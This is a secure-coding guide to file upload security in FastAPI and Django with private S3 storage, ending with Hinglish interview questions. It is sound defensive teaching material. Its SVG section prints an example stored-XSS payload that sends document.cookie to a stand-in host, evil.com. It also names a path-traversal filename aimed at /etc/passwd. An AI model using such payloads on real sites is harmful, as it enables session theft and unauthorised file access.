# File Upload Security

## Why File Upload is Dangerous

```
User uploads file
      ↓
If not validated:
  - Malicious executable (.php, .py, .sh) → Remote Code Execution
  - Huge file (5GB) → Server storage/memory exhausted
  - Zip bomb (1KB zip → 10GB extracted) → DoS
  - Path traversal (../../etc/passwd) → read arbitrary files
  - MIME spoofing (rename malware.exe → photo.jpg) → bypass extension check
  - Stored XSS (SVG with <script>) → browser executes JS
```

---

## The Right Architecture

```
Client
  ↓
Django/FastAPI validates:
  1. File size ≤ limit
  2. Extension in allowlist
  3. Magic bytes match claimed type
  4. Random filename assigned
  ↓
S3 (private bucket, NOT public)
  ↓
Client accesses via Pre-signed URL (time-limited)
```

**NEVER serve uploaded files directly from your app server.**
**NEVER put uploaded files in a public S3 bucket.**

---

## Validation Layers

### Layer 1: File Size
```python
MAX_UPLOAD_SIZE = 10 * 1024 * 1024  # 10 MB

# FastAPI
from fastapi import UploadFile, HTTPException

async def validate_size(file: UploadFile) -> bytes:
    content = await file.read()
    if len(content) > MAX_UPLOAD_SIZE:
        raise HTTPException(413, f"File too large. Max {MAX_UPLOAD_SIZE // (1024*1024)}MB")
    return content
```

### Layer 2: Extension Allowlist (NOT blocklist)
```python
ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".pdf", ".csv", ".xlsx"}

import os
from pathlib import Path

def validate_extension(filename: str) -> str:
    suffix = Path(filename).suffix.lower()
    if suffix not in ALLOWED_EXTENSIONS:
        raise HTTPException(415, f"File type {suffix} not allowed")
    return suffix

# WHY allowlist, not blocklist?
# Blocklist: block .php, .py, .sh... but miss .phtml, .php5, .phar
# Allowlist: only jpg/png/pdf — anything else rejected
```

### Layer 3: Magic Bytes (Content Validation) ← Most Important
```python
# Extension can be renamed: malware.exe → photo.jpg
# Magic bytes = actual first bytes of file content — cannot be easily faked

MAGIC_BYTES = {
    b"\xff\xd8\xff": "image/jpeg",     # JPEG
    b"\x89PNG\r\n":  "image/png",      # PNG
    b"GIF87a":       "image/gif",      # GIF87
    b"GIF89a":       "image/gif",      # GIF89
    b"%PDF-":        "application/pdf", # PDF
    b"PK\x03\x04":  "application/zip", # ZIP (also .xlsx, .docx)
}

def validate_magic_bytes(content: bytes, allowed_types: set[str]) -> str:
    for magic, mime_type in MAGIC_BYTES.items():
        if content.startswith(magic):
            if mime_type not in allowed_types:
                raise HTTPException(415, f"Content type {mime_type} not allowed")
            return mime_type
    raise HTTPException(415, "Unknown or unsupported file type")

# python-magic library (more comprehensive):
# pip install python-magic
import magic

def validate_with_magic_lib(content: bytes) -> str:
    detected = magic.from_buffer(content, mime=True)
    if detected not in ALLOWED_MIME_TYPES:
        raise HTTPException(415, f"Detected type {detected} not allowed")
    return detected
```

### Layer 4: Random Filename (NEVER use user-provided filename)
```python
import uuid, os

def safe_filename(original: str) -> str:
    # User: "../../etc/passwd" → our code: "a3f7c2d1-9e8b-4a2f-b6c5-1d2e3f4a5b6c.jpg"
    suffix = Path(original).suffix.lower()
    return f"{uuid.uuid4()}{suffix}"

# WHY?
# 1. Path traversal: "../../etc/passwd" as filename → directory traversal
# 2. Overwrite: "config.py" → overwrite existing file
# 3. XSS: ""><script>alert(1)</script>.jpg" in HTML context
# 4. Predictability: sequential IDs → enumerate other users' files
```

---

## Full FastAPI Implementation

```python
import boto3, magic, os, uuid
from fastapi import FastAPI, UploadFile, HTTPException, Depends
from pathlib import Path

app = FastAPI()
s3  = boto3.client("s3", region_name="ap-south-1")

BUCKET          = "my-app-uploads"
MAX_SIZE        = 10 * 1024 * 1024   # 10 MB
ALLOWED_EXTS    = {".jpg", ".jpeg", ".png", ".pdf"}
ALLOWED_MIMES   = {"image/jpeg", "image/png", "application/pdf"}


@app.post("/upload")
async def upload_file(file: UploadFile, user_id: int = Depends(get_current_user)):
    # 1. Read content
    content = await file.read()

    # 2. Size check
    if len(content) > MAX_SIZE:
        raise HTTPException(413, "File too large")

    # 3. Extension check
    ext = Path(file.filename or "").suffix.lower()
    if ext not in ALLOWED_EXTS:
        raise HTTPException(415, "Extension not allowed")

    # 4. Magic bytes check (actual content, not just extension)
    detected_mime = magic.from_buffer(content[:1024], mime=True)
    if detected_mime not in ALLOWED_MIMES:
        raise HTTPException(415, f"Content type {detected_mime} not allowed")

    # 5. Random filename (never trust user filename)
    safe_name = f"uploads/{user_id}/{uuid.uuid4()}{ext}"

    # 6. Upload to S3 (private — no public-read ACL)
    s3.put_object(
        Bucket=BUCKET,
        Key=safe_name,
        Body=content,
        ContentType=detected_mime,
        ServerSideEncryption="AES256",
    )

    return {"key": safe_name, "size": len(content)}


@app.get("/download/{file_key:path}")
async def get_download_url(file_key: str, user_id: int = Depends(get_current_user)):
    # Verify user owns this file (check DB)
    if not user_owns_file(user_id, file_key):
        raise HTTPException(403, "Access denied")

    # Generate pre-signed URL (expires in 15 minutes)
    url = s3.generate_presigned_url(
        "get_object",
        Params={"Bucket": BUCKET, "Key": file_key},
        ExpiresIn=900,   # 15 minutes
    )
    return {"url": url, "expires_in": 900}
```

---

## Django Implementation

```python
# views.py
from django.core.exceptions import ValidationError
from django.http import JsonResponse
import boto3, magic, uuid
from pathlib import Path

s3 = boto3.client("s3")

ALLOWED_MIMES = {"image/jpeg", "image/png", "application/pdf"}
MAX_SIZE      = 10 * 1024 * 1024

def upload(request):
    if request.method != "POST":
        return JsonResponse({"error": "Method not allowed"}, status=405)

    uploaded = request.FILES.get("file")
    if not uploaded:
        return JsonResponse({"error": "No file"}, status=400)

    content = uploaded.read()

    if len(content) > MAX_SIZE:
        return JsonResponse({"error": "File too large"}, status=413)

    detected = magic.from_buffer(content[:1024], mime=True)
    if detected not in ALLOWED_MIMES:
        return JsonResponse({"error": "File type not allowed"}, status=415)

    ext      = Path(uploaded.name).suffix.lower()
    key      = f"uploads/{request.user.id}/{uuid.uuid4()}{ext}"

    s3.put_object(
        Bucket="my-app-uploads",
        Key=key,
        Body=content,
        ContentType=detected,
        ServerSideEncryption="AES256",
    )

    return JsonResponse({"key": key}, status=201)
```

---

## S3 Bucket Security Config

```json
// Bucket Policy — deny all public access
{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "DenyPublicAccess",
    "Effect": "Deny",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::my-app-uploads/*",
    "Condition": {
      "StringNotEquals": {
        "aws:PrincipalAccount": "123456789012"
      }
    }
  }]
}
```

```python
# Bucket settings (boto3):
s3.put_public_access_block(
    Bucket="my-app-uploads",
    PublicAccessBlockConfiguration={
        "BlockPublicAcls": True,
        "IgnorePublicAcls": True,
        "BlockPublicPolicy": True,
        "RestrictPublicBuckets": True,
    }
)
```

---

## Zip Bomb Protection

```python
import zipfile, io

MAX_UNZIPPED_SIZE = 100 * 1024 * 1024  # 100 MB extracted limit

def validate_zip(content: bytes) -> None:
    try:
        with zipfile.ZipFile(io.BytesIO(content)) as zf:
            total_size = sum(info.file_size for info in zf.infolist())
            if total_size > MAX_UNZIPPED_SIZE:
                raise HTTPException(413, "Zip contents too large (possible zip bomb)")
            # Also check file count
            if len(zf.infolist()) > 1000:
                raise HTTPException(413, "Too many files in zip")
    except zipfile.BadZipFile:
        raise HTTPException(415, "Invalid zip file")
```

---

## SVG — Special Case (Stored XSS)

```xml
<!-- Attacker uploads "photo.svg" with this content: -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>document.location='https://evil.com?c='+document.cookie</script>
</svg>
```

**Fix:** Never serve SVG directly to browser as `image/svg+xml`.
Options:
1. Don't allow SVG
2. Sanitize SVG (remove `<script>`, `onclick`, `onload` attributes) using `bleach` or `lxml`
3. Serve as `Content-Type: text/plain` (browser won't execute JS)
4. Convert to PNG server-side (Pillow)

---

## Virus Scanning (Production)

```python
# AWS approach: S3 → Lambda → ClamAV scan → tag file
# Or: use third-party service (VirusTotal API, ClamAV in container)

# Pattern:
# 1. Upload to S3 with tag "scan_status=pending"
# 2. S3 event → Lambda triggers ClamAV
# 3. Clean → tag "scan_status=clean" → file available
# 4. Infected → tag "scan_status=infected" → delete + alert

# Simple ClamAV in Python (for self-hosted):
import clamd

cd = clamd.ClamdUnixSocket()

def scan_file(content: bytes) -> bool:
    result = cd.instream(io.BytesIO(content))
    status = result.get("stream", (None,))[0]
    return status == "OK"   # True = clean, False = infected
```

---

## Security Checklist

```
Upload endpoint:
✅ Size limit enforced (before reading full content — use Content-Length header check first)
✅ Extension allowlist (not blocklist)
✅ Magic bytes / MIME validation (python-magic)
✅ Random UUID filename (never user-provided)
✅ Upload to S3 private bucket (not public, not local disk)
✅ Server-side encryption (AES256 or KMS)
✅ Ownership check on download

S3 bucket:
✅ Block all public access
✅ No public-read ACL on objects
✅ Pre-signed URLs for access (expire in 15-60 min)
✅ Bucket versioning (for recovery)
✅ Access logging enabled

Advanced:
✅ Zip bomb protection if accepting archives
✅ SVG sanitization or rejection
✅ Virus scanning for sensitive contexts (documents, executables)
✅ Rate limit upload endpoint (prevent storage exhaustion)
✅ Audit log: who uploaded what, when
```

---

## Interview Q&A

**Q: File upload endpoint mein sabse bada risk kya hai?**
A: Teen main risks: (1) Malicious file type — executable upload karke RCE. (2) Path traversal — `../../etc/passwd` as filename → arbitrary file read/overwrite. (3) Size exhaustion — huge files server memory/storage blow kar dete hain. Fix: magic bytes validation, UUID filename, size limit.

**Q: Extension check kaafi hai? `file.content_type` pe trust karo?**
A: Dono insufficient hain alone. Extension rename ho sakti hai. `Content-Type` header client-controlled hai — attacker kuch bhi bhej sakta hai. Sirf magic bytes (actual file content ke first bytes) reliable hain. Python-magic library use karo.

**Q: S3 pe upload ke baad file publicly accessible kyun nahi honi chahiye?**
A: Agar bucket public hai toh koi bhi file ka URL guess karke access kar sakta hai. Private bucket + pre-signed URL se sirf authorized users access kar sakte hain, URL time-limited hoti hai (15 min), aur audit trail rehti hai.

**Q: Zip bomb kya hai?**
A: Specially crafted zip jo 1KB compressed mein 10GB+ unzipped data rakhta hai. Server unzip karne pe disk/memory exhaust ho jaata hai. Fix: unzipped total size check karo BEFORE actually extracting (zipfile.infolist() se file_size sum karo).

**Q: SVG upload allow karna safe hai?**
A: Nahi, by default. SVG mein `<script>` tag allowed hota hai — stored XSS possible. Ya reject karo, ya sanitize karo (bleach library), ya PNG convert karo server-side.
